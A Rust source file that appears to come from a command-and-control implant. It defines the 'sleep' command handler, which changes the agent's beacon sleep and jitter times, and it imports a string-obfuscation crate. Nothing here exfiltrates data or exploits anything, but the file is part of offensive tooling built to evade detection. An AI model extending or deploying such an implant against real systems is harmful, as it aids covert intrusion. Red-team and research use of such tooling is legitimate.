use std::error::Error;
use litcrypt::lc;
use crate::cmd::{CommandArgs, ConfigOptions, notion_out};

/// Modifies the sleep and jitter times
/// 
/// Usage: `sleep [SLEEP_TIME] [JITTER_TIME]`
pub async fn handle(cmd_args: &mut CommandArgs, config_options: &mut ConfigOptions) -> Result<String, Box<dyn Error>> {
    let sleep_interval: u64 = cmd_args
        .nth(0)
        .unwrap()
        .parse()
        .unwrap_or_else(|_| config_options.sleep_interval);
    let jitter_time: u64 = cmd_args
        .nth(0)
        .unwrap()
        .parse()
        .unwrap_or_else(|_| config_options.jitter_time);
    config_options.sleep_interval = sleep_interval;
    config_options.jitter_time = jitter_time;
    notion_out!("[+] Sleep time / Jitter time: ", &format!("{sleep_interval} / {jitter_time}"))
}